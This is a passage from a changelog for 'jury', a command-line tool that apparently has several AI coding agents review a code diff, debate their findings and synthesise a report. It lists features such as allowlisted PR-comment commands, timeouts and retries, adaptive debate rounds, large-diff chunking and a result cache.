- GitHub comment commands (#11): a `jury comment --text "/jury review …"`
  mode parses allowlisted PR-comment commands (`review`, `summary`; `--rounds`
  only) into a safe jury run — comment text never reaches a shell. Includes a
  documented, author-gated GitHub Actions recipe in the cookbook.
- Run budget, retries, and partial-result policy (#30): optional `total_timeout`
  / `phase_timeout` budgets and opt-in `retries` for transient
  (timeout/rate-limit/spawn) failures. The effective per-call timeout is the min
  of the agent timeout and the budgets; skipped/failed/retried/timed-out agents
  are surfaced in the report and run metadata; `Ctrl-C` exits cleanly (130). CLI:
  `--total-timeout`, `--phase-timeout`, `--retries`.
- Convergence-based early stop / adaptive debate rounds (#40): with
  `early_stop = true`, a unanimous round-1 panel skips the debate and
  disagreement runs debate up to `max_rounds`, stopping when disputes resolve.
  Rounds executed and the stop reason appear in logs and metadata. A fixed
  `--rounds` keeps reproducible fixed-N behaviour. CLI: `--early-stop` /
  `--no-early-stop`, `--max-rounds`.
- Large-diff handling (#31): the diff is measured and filtered (binary,
  generated/vendored files, and `[jury.diff]` include/exclude globs) before
  review; an over-budget diff is chunked by file (`chunk = true`) or rejected
  with an actionable message. CLI reports size and the selected mode. CLI:
  `--max-diff-bytes`, `--chunk` / `--no-chunk`, `--exclude`, `--include`.
- Optional local result cache (#33): `--cache` reuses a stored outcome for an
  unchanged diff+config (key covers diff, config hash, prompt version, package
  version, context policy, seed) and stores on a miss; cache hits are marked in
  logs and metadata. Clear with `jury cache clear` or `--clear-cache`.
  Privacy implications documented in `docs/configuration.md`.
- Maintainer governance (#26): `MAINTAINERS.md` documents triage labels, release
  cadence, the compatibility/deprecation policy, decision-making, security
  routing, and how project-specific requests are handled; linked from
  CONTRIBUTING.

## [0.1.0] - 2026-05-30

### Added
- Initial project-agnostic release of the cross-vendor review jury.
- Native CLI adapters for Claude Code, Codex CLI, and Antigravity.
- Review, debate, and synthesis orchestration pipeline.
- Offline mock mode with unit tests and CLI smoke coverage.
- GitHub PR diff input and optional PR comment output through the GitHub CLI.
- Bundled Claude Code skill for invoking the jury from another project.

